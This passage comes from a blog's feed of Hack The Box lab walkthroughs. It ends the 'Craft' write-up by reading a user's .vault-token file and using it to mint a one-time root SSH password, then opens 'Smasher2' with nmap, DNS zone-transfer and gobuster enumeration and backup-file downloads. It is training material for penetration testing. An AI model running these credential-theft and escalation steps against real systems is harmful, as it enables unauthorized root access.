13:31 .gnupg</span><br><span class="line">-rw-r--r-- 1 gilfoyle gilfoyle  148 Feb  8  2019 .profile</span><br><span class="line">drwx------ 2 gilfoyle gilfoyle 4096 Feb  9  2019 .ssh</span><br><span class="line">-r-------- 1 gilfoyle gilfoyle   33 Feb  9  2019 user.txt</span><br><span class="line">-rw------- 1 gilfoyle gilfoyle   36 Feb  9  2019 .vault-token</span><br><span class="line">-rw------- 1 gilfoyle gilfoyle 5091 Jan  3 13:28 .viminfo</span><br><span class="line">gilfoyle@craft:~$ cat .vault-token </span><br><span class="line">f1783c8d-41c7-0b12-d1c1-cf2aa17ac6b9gilfoyle@craft:~$</span><br></pre></td></tr></table></figure><p>A quick search revealed that it’s related to <a href="https://www.vaultproject.io/" target="_blank" rel="noopener"><code>vault</code></a>.</p><blockquote><p>Secure, store and tightly control access to tokens, passwords, certificates, encryption keys for protecting secrets and other sensitive data using a UI, CLI, or HTTP API. -<a href="https://www.vaultproject.io/" target="_blank" rel="noopener">vaultproject.io</a></p></blockquote><p>By looking at <code>vault.sh</code> from <code>craft-infra</code> repository (<code>vault/vault.sh</code>), we’ll see that it enables the <a href="https://www.vaultproject.io/docs/secrets/ssh/index.html" target="_blank" rel="noopener"><code>ssh</code> secrets engine</a> then creates an <a href="https://www.vaultproject.io/docs/secrets/ssh/one-time-ssh-passwords.html" target="_blank" rel="noopener"><code>otp</code> role</a> for <code>root</code>:</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#!/bin/bash</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># set up vault secrets backend</span></span><br><span class="line"></span><br><span class="line">vault secrets <span class="built_in">enable</span> ssh</span><br><span class="line"></span><br><span class="line">vault write ssh/roles/root_otp \</span><br><span class="line">    key_type=otp \</span><br><span class="line">    default_user=root \</span><br><span class="line">    cidr_list=0.0.0.0/0</span><br></pre></td></tr></table></figure><p>We have the token (<code>.vault-token</code>) so we can easily authenticate to the vault and create an <code>otp</code> for a root <code>ssh</code> session:</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><span class="line">gilfoyle@craft:~$ vault login</span><br><span class="line">Token (will be hidden): </span><br><span class="line">Success! You are now authenticated. The token information displayed below</span><br><span class="line">is already stored in the token helper. You do NOT need to run &quot;vault login&quot;</span><br><span class="line">again. Future Vault requests will automatically use this token.</span><br><span class="line"></span><br><span class="line">Key                  Value</span><br><span class="line">---                  -----</span><br><span class="line">token                f1783c8d-41c7-0b12-d1c1-cf2aa17ac6b9</span><br><span class="line">token_accessor       1dd7b9a1-f0f1-f230-dc76-46970deb5103</span><br><span class="line">token_duration       ∞</span><br><span class="line">token_renewable      false</span><br><span class="line">token_policies       [&quot;root&quot;]</span><br><span class="line">identity_policies    []</span><br><span class="line">policies             [&quot;root&quot;]</span><br><span class="line">gilfoyle@craft:~$ vault write ssh&#x2F;creds&#x2F;root_otp ip&#x3D;127.0.0.1</span><br><span class="line">Key                Value</span><br><span class="line">---                -----</span><br><span class="line">lease_id           ssh&#x2F;creds&#x2F;root_otp&#x2F;f17d03b6-552a-a90a-02b8-0932aaa20198</span><br><span class="line">lease_duration     768h</span><br><span class="line">lease_renewable    false</span><br><span class="line">ip                 127.0.0.1</span><br><span class="line">key                c495f06b-daac-8a95-b7aa-c55618b037ee</span><br><span class="line">key_type           otp</span><br><span class="line">port               22</span><br><span class="line">username           root</span><br><span class="line">gilfoyle@craft:~$</span><br></pre></td></tr></table></figure><p>And finally we’ll <code>ssh</code> into <code>localhost</code> and use the generated password (<code>c495f06b-daac-8a95-b7aa-c55618b037ee</code>):</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br></pre></td><td class="code"><pre><span class="line">gilfoyle@craft:~$ ssh root@127.0.0.1</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">  .   *   ..  . *  *</span><br><span class="line">*  * @()Ooc()*   o  .</span><br><span class="line">    (Q@*0CG*O()  ___</span><br><span class="line">   |\_________&#x2F;|&#x2F; _ \</span><br><span class="line">   |  |  |  |  | &#x2F; | |</span><br><span class="line">   |  |  |  |  | | | |</span><br><span class="line">   |  |  |  |  | | | |</span><br><span class="line">   |  |  |  |  | | | |</span><br><span class="line">   |  |  |  |  | | | |</span><br><span class="line">   |  |  |  |  | \_| |</span><br><span class="line">   |  |  |  |  |\___&#x2F;</span><br><span class="line">   |\_|__|__|_&#x2F;|</span><br><span class="line">    \_________&#x2F;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">Password: </span><br><span class="line">Linux craft.htb 4.9.0-8-amd64 #1 SMP Debian 4.9.130-2 (2018-10-27) x86_64</span><br><span class="line"></span><br><span class="line">The programs included with the Debian GNU&#x2F;Linux system are free software;</span><br><span class="line">the exact distribution terms for each program are described in the</span><br><span class="line">individual files in &#x2F;usr&#x2F;share&#x2F;doc&#x2F;*&#x2F;copyright.</span><br><span class="line"></span><br><span class="line">Debian GNU&#x2F;Linux comes with ABSOLUTELY NO WARRANTY, to the extent</span><br><span class="line">permitted by applicable law.</span><br><span class="line">Last login: Tue Aug 27 04:53:14 2019</span><br><span class="line">root@craft:~#</span><br></pre></td></tr></table></figure><p><img src="/images/hackthebox/craft/21.png" alt=""><br>And we owned root !<br>That’s it , Feedback is appreciated !<br>Don’t forget to read the <a href="/categories">previous write-ups</a> , Tweet about the write-up if you liked it , follow on twitter <a href="https://twitter.com/Ahm3d_H3sham" target="_blank" rel="noopener">@Ahm3d_H3sham</a><br>Thanks for reading.</p><p>Previous Hack The Box write-up : <a href="/hack-the-box/smasher2/">Hack The Box - Smasher2</a><br>Next Hack The Box write-up : <a href="/hack-the-box/bitlab/">Hack The Box - Bitlab</a></p>]]></content:encoded>
      
      <comments>https://0xrick.github.io/hack-the-box/craft/#disqus_thread</comments>
    </item>
    
    <item>
      <title>Hack The Box - Smasher2</title>
      <link>https://0xrick.github.io/hack-the-box/smasher2/</link>
      <guid>https://0xrick.github.io/hack-the-box/smasher2/</guid>
      <pubDate>Sat, 14 Dec 2019 03:00:00 GMT</pubDate>
      <description>
      
        My write-up / walkthrough for Smasher2 from Hack The Box.
      
      </description>
      
      
      <content:encoded><![CDATA[<h1 id="Hack-The-Box-Smasher2"><a href="#Hack-The-Box-Smasher2" class="headerlink" title="Hack The Box - Smasher2"></a>Hack The Box - Smasher2</h1><h2 id="Quick-Summary"><a href="#Quick-Summary" class="headerlink" title="Quick Summary"></a>Quick Summary</h2><p>Hey guys, today smasher2 retired and here’s my write-up about it. Smasher2 was an interesting box and one of the hardest I have ever solved. Starting with a web application vulnerable to authentication bypass and <code>RCE</code> combined with a <code>WAF</code> bypass, then a kernel module with an insecure <code>mmap</code> handler implementation allowing users to access kernel memory. I enjoyed the box and learned a lot from it. It’s a Linux box and its ip is <code>10.10.10.135</code>, I added it to <code>/etc/hosts</code> as <code>smasher2.htb</code>. Let’s jump right in!</p><p><img src="/images/hackthebox/smasher2/0.png" alt=""></p><h2 id="Nmap"><a href="#Nmap" class="headerlink" title="Nmap"></a>Nmap</h2><p>As always we will start with <code>nmap</code> to scan for open ports and services:</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line">root@kali:~&#x2F;Desktop&#x2F;HTB&#x2F;boxes&#x2F;smasher2# nmap -sV -sT -sC -o nmapinitial smasher2.htb </span><br><span class="line">Starting Nmap 7.80 ( https:&#x2F;&#x2F;nmap.org ) at 2019-12-13 07:32 EST</span><br><span class="line">Nmap scan report for smasher2.htb (10.10.10.135)</span><br><span class="line">Host is up (0.18s latency).</span><br><span class="line">Not shown: 997 closed ports</span><br><span class="line">PORT   STATE SERVICE VERSION</span><br><span class="line">22&#x2F;tcp open  ssh     OpenSSH 7.6p1 Ubuntu 4ubuntu0.2 (Ubuntu Linux; protocol 2.0)</span><br><span class="line">| ssh-hostkey: </span><br><span class="line">|   2048 23:a3:55:a8:c6:cc:74:cc:4d:c7:2c:f8:fc:20:4e:5a (RSA)</span><br><span class="line">|   256 16:21:ba:ce:8c:85:62:04:2e:8c:79:fa:0e:ea:9d:33 (ECDSA)</span><br><span class="line">|_  256 00:97:93:b8:59:b5:0f:79:52:e1:8a:f1:4f:ba:ac:b4 (ED25519)</span><br><span class="line">53&#x2F;tcp open  domain  ISC BIND 9.11.3-1ubuntu1.3 (Ubuntu Linux)</span><br><span class="line">| dns-nsid: </span><br><span class="line">|_  bind.version: 9.11.3-1ubuntu1.3-Ubuntu</span><br><span class="line">80&#x2F;tcp open  http    Apache httpd 2.4.29 ((Ubuntu))</span><br><span class="line">|_http-server-header: Apache&#x2F;2.4.29 (Ubuntu)</span><br><span class="line">|_http-title: 403 Forbidden</span><br><span class="line">Service Info: OS: Linux; CPE: cpe:&#x2F;o:linux:linux_kernel</span><br><span class="line"></span><br><span class="line">Service detection performed. Please report any incorrect results at https:&#x2F;&#x2F;nmap.org&#x2F;submit&#x2F; .</span><br><span class="line">Nmap done: 1 IP address (1 host up) scanned in 34.74 seconds</span><br><span class="line">root@kali:~&#x2F;Desktop&#x2F;HTB&#x2F;boxes&#x2F;smasher2#</span><br></pre></td></tr></table></figure><p>We got <code>ssh</code> on port 22, <code>dns</code> on port 53 and <code>http</code> on port 80.</p><h2 id="DNS"><a href="#DNS" class="headerlink" title="DNS"></a>DNS</h2><p>First thing I did was to enumerate <code>vhosts</code> through the <code>dns</code> server and I got 1 result:</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line">root@kali:~&#x2F;Desktop&#x2F;HTB&#x2F;boxes&#x2F;smasher2# dig axfr smasher2.htb @10.10.10.135</span><br><span class="line"></span><br><span class="line">; &lt;&lt;&gt;&gt; DiG 9.11.5-P4-5.1+b1-Debian &lt;&lt;&gt;&gt; axfr smasher2.htb @10.10.10.135</span><br><span class="line">;; global options: +cmd</span><br><span class="line">smasher2.htb.           604800  IN      SOA     smasher2.htb. root.smasher2.htb. 41 604800 86400 2419200 604800</span><br><span class="line">smasher2.htb.           604800  IN      NS      smasher2.htb.</span><br><span class="line">smasher2.htb.           604800  IN      A       127.0.0.1</span><br><span class="line">smasher2.htb.           604800  IN      AAAA    ::1</span><br><span class="line">smasher2.htb.           604800  IN      PTR     wonderfulsessionmanager.smasher2.htb.</span><br><span class="line">smasher2.htb.           604800  IN      SOA     smasher2.htb. root.smasher2.htb. 41 604800 86400 2419200 604800</span><br><span class="line">;; Query time: 299 msec</span><br><span class="line">;; SERVER: 10.10.10.135#53(10.10.10.135)</span><br><span class="line">;; WHEN: Fri Dec 13 07:36:43 EST 2019</span><br><span class="line">;; XFR size: 6 records (messages 1, bytes 242)</span><br><span class="line"></span><br><span class="line">root@kali:~&#x2F;Desktop&#x2F;HTB&#x2F;boxes&#x2F;smasher2#</span><br></pre></td></tr></table></figure><p><code>wonderfulsessionmanager.smasher2.htb</code>, I added it to my <code>hosts</code> file.</p><h2 id="Web-Enumeration"><a href="#Web-Enumeration" class="headerlink" title="Web Enumeration"></a>Web Enumeration</h2><p><code>http://smasher2.htb</code> had the default <code>Apache</code> index page:<br><img src="/images/hackthebox/smasher2/1.png" alt=""></p><p><code>http://wonderfulsessionmanager.smasher2.htb</code>:<br><img src="/images/hackthebox/smasher2/2.png" alt=""><br>The only interesting here was the login page:<br><img src="/images/hackthebox/smasher2/3.png" alt=""><br>I kept testing it for a while and the responses were like this one:<br><img src="/images/hackthebox/smasher2/4.png" alt=""></p><p><img src="/images/hackthebox/smasher2/5.png" alt=""><br>It didn’t request any new pages so I suspected that it’s doing an <code>AJAX</code> request, I intercepted the login request to find out the endpoint it was requesting:</p><figure class="highlight"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">POST</span> <span class="string">/auth</span> HTTP/1.1</span><br><span class="line"><span class="attribute">Host</span>: wonderfulsessionmanager.smasher2.htb</span><br><span class="line"><span class="attribute">User-Agent</span>: Mozilla/5.0 (X11; Linux x86_64; rv:68.0) Gecko/20100101 Firefox/68.0</span><br><span class="line"><span class="attribute">Accept</span>: application/json, text/javascript, */*; q=0.01</span><br><span class="line"><span class="attribute">Accept-Language</span>: en-US,en;q=0.5</span><br><span class="line"><span class="attribute">Accept-Encoding</span>: gzip, deflate</span><br><span class="line"><span class="attribute">Referer</span>: http://wonderfulsessionmanager.smasher2.htb/login</span><br><span class="line"><span class="attribute">Content-Type</span>: application/json</span><br><span class="line"><span class="attribute">X-Requested-With</span>: XMLHttpRequest</span><br><span class="line"><span class="attribute">Content-Length</span>: 80</span><br><span class="line"><span class="attribute">Connection</span>: close</span><br><span class="line"><span class="attribute">Cookie</span>: session=eyJpZCI6eyIgYiI6Ik16UXpNakpoTVRVeVlqaGlNekJsWVdSbU9HTXlPV1kzTmprMk1XSTROV00xWkdVME5HTmxNQT09In19.XfNxUQ.MznJKgs2isklCZxfV4G0IjEPcvg</span><br><span class="line"></span><br><span class="line">&#123;"action":"auth","data":&#123;"username":"test","password":"test"&#125;&#125;</span><br></pre></td></tr></table></figure><p>While browsing <code>http://wonderfulsessionmanager.smasher2.htb</code> I had <code>gobuster</code> running in the background on <code>http://smasher2.htb/</code>:</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br></pre></td><td class="code"><pre><span class="line">root@kali:~&#x2F;Desktop&#x2F;HTB&#x2F;boxes&#x2F;smasher2# gobuster dir -u http:&#x2F;&#x2F;smasher2.htb&#x2F; -w &#x2F;usr&#x2F;share&#x2F;wordlists&#x2F;dirb&#x2F;common.txt </span><br><span class="line">&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;</span><br><span class="line">Gobuster v3.0.1</span><br><span class="line">by OJ Reeves (@TheColonial) &amp; Christian Mehlmauer (@_FireFart_)</span><br><span class="line">&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;</span><br><span class="line">[+] Url:            http:&#x2F;&#x2F;smasher2.htb&#x2F;</span><br><span class="line">[+] Threads:        10</span><br><span class="line">[+] Wordlist:       &#x2F;usr&#x2F;share&#x2F;wordlists&#x2F;dirb&#x2F;common.txt</span><br><span class="line">[+] Status codes:   200,204,301,302,307,401,403</span><br><span class="line">[+] User Agent:     gobuster&#x2F;3.0.1</span><br><span class="line">[+] Timeout:        10s</span><br><span class="line">&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;</span><br><span class="line">2019&#x2F;12&#x2F;13 07:37:54 Starting gobuster</span><br><span class="line">&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;</span><br><span class="line">&#x2F;.git&#x2F;HEAD (Status: 403)</span><br><span class="line">&#x2F;.hta (Status: 403)</span><br><span class="line">&#x2F;.bash_history (Status: 403)</span><br><span class="line">&#x2F;.config (Status: 403)</span><br><span class="line">&#x2F;.bashrc (Status: 403)</span><br><span class="line">&#x2F;.htaccess (Status: 403)</span><br><span class="line">&#x2F;.htpasswd (Status: 403)</span><br><span class="line">&#x2F;.profile (Status: 403)</span><br><span class="line">&#x2F;.mysql_history (Status: 403)</span><br><span class="line">&#x2F;.sh_history (Status: 403)</span><br><span class="line">&#x2F;.svn&#x2F;entries (Status: 403)</span><br><span class="line">&#x2F;_vti_bin&#x2F;_vti_adm&#x2F;admin.dll (Status: 403)</span><br><span class="line">&#x2F;_vti_bin&#x2F;shtml.dll (Status: 403)</span><br><span class="line">&#x2F;_vti_bin&#x2F;_vti_aut&#x2F;author.dll (Status: 403)</span><br><span class="line">&#x2F;akeeba.backend.log (Status: 403)</span><br><span class="line">&#x2F;awstats.conf (Status: 403)</span><br><span class="line">&#x2F;backup (Status: 301)</span><br><span class="line">&#x2F;development.log (Status: 403)</span><br><span class="line">&#x2F;global.asa (Status: 403)</span><br><span class="line">&#x2F;global.asax (Status: 403)</span><br><span class="line">&#x2F;index.html (Status: 200)</span><br><span class="line">&#x2F;main.mdb (Status: 403)</span><br><span class="line">&#x2F;php.ini (Status: 403)</span><br><span class="line">&#x2F;production.log (Status: 403)</span><br><span class="line">&#x2F;readfile (Status: 403)</span><br><span class="line">&#x2F;server-status (Status: 403)</span><br><span class="line">&#x2F;spamlog.log (Status: 403)</span><br><span class="line">&#x2F;Thumbs.db (Status: 403)</span><br><span class="line">&#x2F;thumbs.db (Status: 403)</span><br><span class="line">&#x2F;web.config (Status: 403)</span><br><span class="line">&#x2F;WS_FTP.LOG (Status: 403)</span><br><span class="line">&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;</span><br><span class="line">2019&#x2F;12&#x2F;13 07:39:17 Finished</span><br><span class="line">&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;</span><br><span class="line">root@kali:~&#x2F;Desktop&#x2F;HTB&#x2F;boxes&#x2F;smasher2#</span><br></pre></td></tr></table></figure><p>The only result that wasn’t <code>403</code> was <code>/backup</code> so I checked that and found 2 files:<br><img src="/images/hackthebox/smasher2/6.png" alt=""><br>Note: Months ago when I solved this box for the first time <code>/backup</code> was protected by basic <code>http</code> authentication, that wasn’t the case when I revisited the box for the write-up even after resetting it. I guess it got removed, however it wasn’t an important step, it was just heavy brute force so the box is better without it.<br>I downloaded the files to my box:</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><span class="line">root@kali:~&#x2F;Desktop&#x2F;HTB&#x2F;boxes&#x2F;smasher2# mkdir backup</span><br><span class="line">root@kali:~&#x2F;Desktop&#x2F;HTB&#x2F;boxes&#x2F;smasher2# cd backup&#x2F;</span><br><span class="line">root@kali:~&#x2F;Desktop&#x2F;HTB&#x2F;boxes&#x2F;smasher2&#x2F;backup# wget http:&#x2F;&#x2F;smasher2.htb&#x2F;backup&#x2F;auth.py</span><br><span class="line">--2019-12-13 07:40:19--  http:&#x2F;&#x2F;smasher2.htb&#x2F;backup&#x2F;auth.py</span><br><span class="line">Resolving smasher2.htb (smasher2.htb)... 10.10.10.135</span><br><span class="line">Connecting to smasher2.htb (smasher2.htb)|10.10.10.135|:80... connected.</span><br><span class="line">HTTP request sent, awaiting response... 200 OK</span><br><span class="line">Length: 4430 (4.3K) [text&#x2F;x-python]</span><br><span class="line">Saving to: ‘auth.py’</span><br><span class="line"></span><br><span class="line">auth.py                                                    100%[&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&gt;]   4.33K  --.-KB&#x2F;s    in 0.07s   </span><br><span class="line"></span><br><span class="line">2019-12-13 07:40:20 (64.2 KB&#x2F;s) - ‘auth.py’ saved [4430&#x2F;4430]</span><br><span class="line"></span><br><span class="line">root@kali:~&#x2F;Desktop&#x2F;HTB&#x2F;boxes&#x2F;smasher2&#x2F;backup# wget http:&#x2F;&#x2F;smasher2.htb&#x2F;backup&#x2F;ses.so </span><br><span class="line">--2019-12-13 07:40:43--  http:&#x2F;&#x2F;smasher2.htb&#x2F;backup&#x2F;ses.so</span><br><span class="line">Resolving smasher2.htb (smasher2.htb)... 10.10.10.135</span><br><span class="line">Connecting to smasher2.htb (smasher2.htb)|10.10.10.135|:80... connected.</span><br><span class="line">HTTP request sent, awaiting response... 200 OK</span><br><span class="line">Length: 18608 (18K)</span><br><span class="line">Saving to: ‘ses.so’</span><br><span class="line"></span><br><span class="line">ses.so                                                     